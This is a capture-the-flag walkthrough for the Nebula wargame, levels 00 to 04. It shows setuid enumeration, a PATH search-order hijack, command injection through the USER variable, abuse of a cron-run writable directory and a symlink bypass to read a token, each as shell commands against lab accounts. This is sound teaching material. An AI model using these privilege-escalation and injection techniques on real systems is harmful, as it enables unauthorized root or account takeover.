# Nebula

## Level 00 - Searching for setuid binaries.

Each user in linux is identified using an id , which is an integer, and referred to as UserId. Each process in Linux , has 3 parameters which defines the permissions it has on files, executables etc. These are RUID (real user id), EUID (effective user id) and SUID (Saved User ID).
The RUID of a process is same as the UserID of the user that started the process. Grossly simplified, the EUID of effective user ID of the process comes into the picture when the process needs a particular privilege to execute an action, and the SUID comes into play when executable with set-uid bit set.
The resulting process spawned when the executable is run, will start with the Real User ID of the process that started it i.e the userid of the user running the executable. However, the SUID of the process will be the SUID owner of the executable (the user for which suid bit of this executable has been set). So if USER A (eg id=1008) starts the SUID executable of USER B (id=1009), the RUID, EUID, SUID of the process spawned by user A on this suid will have values (1008,1009,1009) respectively.
This is common practice in linux. Commands like ping for eg, make underlying calls which are privileged, but need to be accessed by all user’s of the system. The suid of ping is set to root, so whenever a user runs ping, the user is temporarily elevated to the privilege of root (EUID, SUID).

So, for this we need to find a suid executable for flag0 user or the root user.
```shell
find / -user flag00 -perm -4000 2>/dev/null or
find / -user flag00 -perm /u=s
```

## Level 01 - Search-order-hijack
This challenge also employs principles centered around SUID executables.
The effective id of the user of the level01 is set to that of flag01 when the flag01 is executed (suid exec)
However, the RUID of the running process will be the id of the user who ran it which is level01. (euid and saved set uid will be that of flag01)

All the 3 ids are then set to the effective uid later in the program using setresuid and setresgid calls (plausibly to deal with the privileges that can get dropped when a system call is made).

We need to execute ‘getflag’ , so if we could somehow manipulate the system call to do our bidding, then we have achieved our goal.
However, the environment variable env and the values are still the ones which were loaded at the program start (which is level01) user.
Since $PATH is in the control of level01 , we can make echo point to anything by prepending it with /tmp/ as shown and control execution.
Note the executable has a setuid bit.
```shell
level01@nebula:/home/flag01$ ls -l
total 8
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
```
This is the interesting line in the source code.
```c
system("/usr/bin/env echo and now what?");
```
Notice how `/usr/bin/env` is called using it's full path, as opposed to `echo`.

We can exploit this fact to execute a `search-order-hijack` attack.

When an executable is mentioned without full path the system will search
the directories listed in the `PATH` environment variable for it.
```shell
level01@nebula:/home/flag01$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```
We can use `env` to set the variable to a directory of our choosing.
```shell
level01@nebula:/home/flag01$ env PATH=/home/level01 ./flag01
/usr/bin/env: echo: No such file or directory
```
Now create a file to replace echo, this file will execute `getflag`
```shell
level01@nebula:/home/flag01$ whereis getflag
getflag: /bin/getflag
level01@nebula:/home/flag01$ echo "/bin/getflag" > /home/level01/echo; chmod 777 /home/level01/echo
```
And run `flag01` again.
```shell
level01@nebula:/home/flag01$ env PATH=/home/level01 ./flag01
You have successfully executed getflag on a target account
```

## Level 02 - USER === $PATH

Like the last challenge’s focus on the PATH variable, the environment variable too is loaded according to the user running it and hence in our control.
We can inject the system call yet again, but this time the variable of the choice will be USER.
```shell
level02@nebula:/home/flag02$ env USER="we r 1337; getflag; echo this" ./flag02
about to call system("/bin/echo we r 1337; getflag; echo this is cool")
we r 1337
You have successfully executed getflag on a target account
this is cool
```
## Level 03 - CronJobs

We have a directory and a shell script:
```shell
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
For each file in the directory,
* `ulimit -5 t` - allow a maximum of 5 seconds in cpu time
* `bash -x "$i"` - execute shell script and print commands executed
* `rm -f "$i"` - force delete file

We can recall a `crontab` is called every couple of minutes.

Let's read about `crontab` from `man`:
```console
man 5 crontab
```
```
 A crontab file contains instructions to the cron(8) daemon of the general form: ``run this command at
 this time on this date''.  Each user has their own crontab, and commands in any given crontab will  be
 executed as the user who owns the crontab.
```
So we can guess `writeable.sh` is going to be executed every couple of minutes.

Write a shell script that executes `getflag` to `/writable.d`.
```shell
getflag > /home/flag03/solved
```
Now we wait till cron executes the crontab.

We can use `watch` to watch `/writable` for when the file is deleted - crontab executed.
```console
watch ls -l /home/flag03/writable.d
```
```shell
level03@nebula:/home/flag03$ ls
solved  writable.d  writable.sh
level03@nebula:/home/flag03$ cat solved
You have successfully executed getflag on a target account
```

Level 04 - Symbolic links
So it would seem that the token file or path supplied won’t help our cause. The way to bypass this is use symbolic links (and not have token anywhere in the symbolic link path)

ln -s /home/flag04/token /tmp/croaken
/home/flag04/flag04 /tmp/croaken
